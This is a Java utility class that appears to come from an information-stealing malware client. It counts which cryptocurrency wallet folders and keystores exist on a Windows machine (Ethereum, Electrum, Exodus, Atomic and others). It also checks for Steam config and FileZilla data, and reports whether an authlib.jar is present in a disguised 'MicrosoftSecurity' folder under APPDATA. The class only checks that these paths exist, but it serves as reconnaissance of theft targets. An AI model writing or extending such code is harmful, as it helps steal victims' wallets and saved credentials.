package dev.client.utils.files.count;

import java.io.File;

public class Count {

    public int countColdWalletFolders() {
        int count = 0;
        count += checkPathExists(System.getenv("APPDATA") + File.separator + "Zcash") ? 1 : 0;
        count += checkPathExists(System.getenv("APPDATA") + File.separator + "Armory") ? 1 : 0;
        count += checkPathExists(System.getenv("APPDATA") + File.separator + "bytecoin") ? 1 : 0;
        count += checkPathExists(System.getenv("APPDATA") + File.separator + "Ethereum\\keystore") ? 1 : 0;
        count += checkPathExists(System.getenv("APPDATA") + File.separator + "Electrum\\wallets") ? 1 : 0;
        count += checkPathExists(System.getenv("APPDATA") + File.separator + "atomic\\Local Storage\\leveldb") ? 1 : 0;
        count += checkPathExists(System.getenv("APPDATA") + File.separator + "Guarda\\Local Storage\\leveldb") ? 1 : 0;
        count += checkPathExists(System.getenv("APPDATA") + File.separator + "Coinomi\\Coinomi\\wallets") ? 1 : 0;
        count += checkFileExists(System.getenv("APPDATA") + "\\Exodus\\exodus.wallet") ? 1 : 0;
        return count;
    }

    public String checkSteamConfigExists() {
        String steamConfigPath = "C:\\Program Files (x86)\\Steam\\config";
        boolean steamExists = checkPathExists(steamConfigPath);
        return steamExists ? "Yes" : "No";
    }

    public String getAuthLibStatus() {
        String authLibJarPath = System.getenv("APPDATA") + "\\MicrosoftSecurity\\authlib.jar";
        boolean authLibExists = checkFileExists(authLibJarPath);
        return authLibExists ? "Enabled" : "Error";
    }


    public String checkFileZillaExists() {
        String fileZillaPath = System.getenv("APPDATA") + "\\FileZilla";
        boolean fileZillaExists = checkPathExists(fileZillaPath);
        return fileZillaExists ? "Yes" : "No";
    }

    private static boolean checkPathExists(String path) {
        File file = new File(path);
        return file.exists();
    }

    private static boolean checkFileExists(String filePath) {
        File file = new File(filePath);
        return file.exists() && file.isFile();
    }
}
